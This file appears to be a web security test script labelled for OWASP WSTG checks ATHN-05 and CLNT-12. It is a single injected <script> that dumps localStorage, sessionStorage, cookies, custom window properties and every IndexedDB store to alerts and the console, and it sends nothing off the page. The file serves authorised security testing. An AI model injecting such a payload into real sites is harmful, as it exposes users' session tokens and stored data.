Prueba WSTG-ATHN-05 y WSTG-CLNT-12



<script>
alert("Local storage..."+localStorage.length);    
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key);
  console.log(`${key}: ${value}`);
  alert("Key.."+key+" Value.. ."+value);
}
alert("Session storage..."+sessionStorage.length);
for (let i = 0; i < sessionStorage.length; i++) {
  const key = sessionStorage.key(i);
  const value = sessionStorage.getItem(key);
  console.log(`${key}: ${value}`);
  alert("Key.."+key+" Value.. ."+value);
}
alert("Cookies..."+window.document.cookie);
console.log(window.document.cookie);
alert("List All Entries on the Window Object");
(() => {

  // create an iframe and append to body to load a clean window object
  const iframe = document.createElement('iframe');
  iframe.style.display = 'none';
  document.body.appendChild(iframe);
  // get the current list of properties on window
  const currentWindow = Object.getOwnPropertyNames(window);
  // filter the list against the properties that exist in the clean window
  const results = currentWindow.filter(
    prop => !iframe.contentWindow.hasOwnProperty(prop)
  );
  // remove iframe
  document.body.removeChild(iframe);
  // log key-value entries that are different
  results.forEach(key => console.log(`${key}: ${window[key]}`));
})();
const dumpIndexedDB = dbName => {
  const DB_VERSION = 1;
  const req = indexedDB.open(dbName, DB_VERSION);
  req.onsuccess = function() {
    const db = req.result;
    const objectStoreNames = db.objectStoreNames || [];
    console.log(`[*] Database: ${dbName}`);
    Array.from(objectStoreNames).forEach(storeName => {
      const txn = db.transaction(storeName, 'readonly');
      const objectStore = txn.objectStore(storeName);
      console.log(`\t[+] ObjectStore: ${storeName}`);
      // Print all entries in objectStore with name `storeName`
      objectStore.getAll().onsuccess = event => {
        const items = event.target.result || [];
        items.forEach(item => console.log(`\t\t[-] `, item));
      };
    });
  };
};
indexedDB.databases().then(dbs => dbs.forEach(db => dumpIndexedDB(db.name)));
</script>